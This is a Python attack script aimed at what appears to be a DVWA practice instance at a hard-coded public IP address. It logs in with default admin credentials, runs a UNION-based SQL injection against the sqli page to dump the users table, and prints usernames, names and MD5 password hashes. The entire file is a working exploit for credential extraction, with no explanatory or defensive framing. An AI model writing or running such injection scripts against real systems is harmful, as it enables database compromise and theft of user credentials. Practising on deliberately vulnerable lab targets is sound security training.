
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] FINAL COMPREHENSIVE DATA EXTRACTION\n")
print("=" * 120)

# Extract ALL columns from users table to see what we have
print("\n[*] Extracting ALL user data with proper username mapping:\n")

all_users_final = []

# Get the GROUP_CONCAT result which gives us the REAL data
payload_str = "-1' UNION SELECT GROUP_CONCAT(user), GROUP_CONCAT(password) FROM users #"
response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)

pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_match:
    result_text = pre_match.group(1)
    
    # Extract the concatenated usernames and passwords
    fname_match = re.search(r'First name: ([^<\n]+)', result_text)
    sname_match = re.search(r'Surname: ([^<\n]+)', result_text)
    
    if fname_match and sname_match:
        usernames_str = fname_match.group(1).strip()
        hashes_str = sname_match.group(1).strip()
        
        usernames_list = usernames_str.split(',')
        hashes_list = hashes_str.split(',')
        
        # Now get first_name and last_name for each user
        for user_id in range(1, 6):
            response_name = session.get(sqli_url, params={"id": str(user_id), "Submit": "Submit"}, verify=False)
            pre_match_name = re.search(r'<pre>(.*?)</pre>', response_name.text, re.DOTALL)
            if pre_match_name:
                result_name = pre_match_name.group(1)
                fname_match_name = re.search(r'First name: ([^<\n]+)', result_name)
                sname_match_name = re.search(r'Surname: ([^<\n]+)', result_name)
                
                first_name = fname_match_name.group(1).strip() if fname_match_name else "N/A"
                last_name = sname_match_name.group(1).strip() if sname_match_name else "N/A"
                
                # Map to the correct user from GROUP_CONCAT
                if user_id - 1 < len(usernames_list):
                    username = usernames_list[user_id - 1].strip()
                    password_hash = hashes_list[user_id - 1].strip()
                    
                    all_users_final.append({
                        "id": str(user_id),
                        "username": username,
                        "first_name": first_name,
                        "last_name": last_name,
                        "password_hash": password_hash
                    })

print("\n" + "=" * 120)
print(f"\n[+] **EXTRACTED USER DATA FROM USERS TABLE** (Total: {len(all_users_final)} users)\n")
print("=" * 120)

# Print final comprehensive table
if all_users_final:
    print(f"\n{'ID':<5} {'Username':<15} {'First Name':<15} {'Last Name':<15} {'Password Hash (MD5)':<40}\n")
    print("-" * 120)
    for user in all_users_final:
        print(f"{user['id']:<5} {user['username']:<15} {user['first_name']:<15} {user['last_name']:<15} {user['password_hash']:<40}")
    print("-" * 120)

print("\n[+] PASSWORD HASHES EXTRACTED:\n")
for user in all_users_final:
    print(f"  {user['username']}: {user['password_hash']}")

print("\n" + "=" * 120)

